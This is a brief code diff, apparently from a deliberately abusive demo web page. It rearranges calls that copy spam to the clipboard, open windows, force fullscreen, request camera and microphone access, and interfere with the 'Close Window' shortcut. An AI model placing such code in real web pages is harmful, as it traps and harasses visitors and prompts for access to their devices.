@@ -169,16 +169,17 @@ function init () {
 
     focusWindows()
     copySpamToClipboard()
-    requestCameraAndMic()
-    enableFullscreen()
-
-    openWindow()
 
     // Capture key presses on the Command or Control keys, to interfere with the
     // "Close Window" shortcut.
     if (event.key === 'Meta' || event.key === 'Control') {
       showAlert()
+    } else {
+      if (!window.opener && Math.random() < 0.33) enableFullscreen()
+      else requestCameraAndMic()
     }
+
+    openWindow()
   })
 }
 
